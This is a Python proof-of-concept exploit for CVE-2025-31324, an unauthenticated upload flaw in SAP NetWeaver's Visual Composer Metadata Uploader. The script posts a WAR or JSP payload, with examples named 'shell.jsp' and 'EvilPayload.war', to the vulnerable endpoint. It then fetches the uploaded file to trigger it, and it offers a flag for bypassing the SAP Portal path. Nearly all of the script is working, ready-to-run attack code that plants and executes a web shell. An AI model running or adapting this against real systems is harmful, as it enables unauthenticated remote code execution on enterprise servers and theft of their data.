#!/usr/bin/env python3
"""
Proof-of-Concept for CVE-2025-31324: Unauthenticated upload in SAP NetWeaver Visual Composer Metadata Uploader

This script performs:
  1. File upload to the vulnerable endpoint (via Upload host/port)
  2. Optional trigger via HTTP GET (via Trigger host/port)
  3. Basic response validation/logging

Usage example:
  python3 PoC.py \
    --host sap.example.com --port 50000 \
    --endpoint /irj/portal/sap/bc/webdynpro/sap/ZWDC_METADATA_UPLDR \
    --file EvilPayload.war \
    --trigger-path /irj/portal/irj/servlet_jsp/irj/root/EvilPayload/shell.jsp \
    --trigger-host sap.example.com --trigger-port 50001 --trigger-https true \
    --bypass-portal

  python3 PoC.py --host sap.example.com --port 50000 \
    --endpoint /developmentserver/metadatauploader \
    --file shell.jsp \
    --trigger-path /visual_composer/shell.jsp \
    --trigger-host sap.example.com --trigger-port 50001 --trigger-https
"""
import requests
import argparse
import sys
import urllib3
from urllib.parse import urljoin

# Disable SSL warnings for self-signed certs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def upload_payload(base_url, endpoint, payload_path, field_name="UPLOAD_METADATA", extra_params=None):
    files = {field_name: (payload_path, open(payload_path, 'rb'), 'application/octet-stream')}
    try:
        resp = requests.post(
            urljoin(base_url, endpoint),
            files=files,
            params=extra_params or {},
            verify=False,
            timeout=10
        )
        return resp.status_code, resp.text
    except Exception as e:
        print(f"[!] Exception during upload: {e}")
        sys.exit(1)


def trigger_payload(base_url, trigger_path):
    try:
        resp = requests.get(urljoin(base_url, trigger_path), verify=False, timeout=10)
        snippet = resp.text[:200].replace('\n', ' ')
        return resp.status_code, snippet
    except Exception as e:
        print(f"[!] Exception during trigger: {e}")
        return None, str(e)


def main():
    parser = argparse.ArgumentParser(description="PoC: CVE-2025-31324 SAP Metadata Uploader")
    # Upload args
    parser.add_argument('--host',     required=True, help="Upload host (IP or FQDN)")
    parser.add_argument('--port',     type=int, default=50001, help="Upload port (default: 50001)")
    parser.add_argument('--endpoint', required=True, help="Upload endpoint path, e.g. /sap/bc/webdynpro/sap/ZWDC_METADATA_UPLDR")
    parser.add_argument('--file',     required=True, help="Local path to WAR/JAR payload")
    parser.add_argument('--https',    action='store_true', help="Use HTTPS for upload (default: HTTP)")
    parser.add_argument('--param',    action='append', help="Additional key=val parameters")
    # Trigger args
    parser.add_argument('--trigger-path',  help="URL path to trigger payload, e.g. /irj/servlet_jsp/irj/root/.../shell.jsp")
    parser.add_argument('--trigger-host',  help="Trigger host (default: same as upload host)")
    parser.add_argument('--trigger-port',  type=int, help="Trigger port (default: same as upload port)")
    parser.add_argument('--trigger-https', action='store_true', help="Use HTTPS for trigger (default: same as upload)")
    # Bypass portal
    parser.add_argument('--bypass-portal', action='store_true', help="Strip '/portal' from endpoint and trigger to bypass SAP Portal")

    args = parser.parse_args()

    # Clean paths if bypassing portal
    upload_ep = args.endpoint
    trigger_ep = args.trigger_path
    if args.bypass_portal:
        upload_ep = upload_ep.replace("/portal", "")
        if trigger_ep:
            trigger_ep = trigger_ep.replace("/portal", "")

    # Build upload base URL
    scheme_up = 'https' if args.https else 'http'
    base_up = f"{scheme_up}://{args.host}:{args.port}"

    # Build trigger base URL
    thost = args.trigger_host or args.host
    tport = args.trigger_port or args.port
    scheme_t = 'https' if args.trigger_https or args.https else 'http'
    base_t = f"{scheme_t}://{thost}:{tport}"

    # Parse extra params
    extra = {}
    if args.param:
        for p in args.param:
            if '=' in p:
                k, v = p.split('=', 1)
                extra[k] = v

    # Upload step
    print(f"[+] Uploading '{args.file}' to {base_up}{upload_ep}")
    status, text = upload_payload(base_up, upload_ep, args.file, extra_params=extra)
    print(f"[+] Upload response: HTTP {status}\n{text[:300]}\n")

    # Trigger step
    if status in (200, 201) and trigger_ep:
        print(f"[+] Triggering at {base_t}{trigger_ep}")
        t_status, t_snip = trigger_payload(base_t, trigger_ep)
        print(f"[+] Trigger response: HTTP {t_status}\nSnippet: {t_snip}\n")
    elif status in (200, 201):
        print("[!] Uploaded successfully; no trigger path specified.")
    else:
        print("[!] Upload failed; please check endpoint and parameters.")

if __name__ == '__main__':
    main()

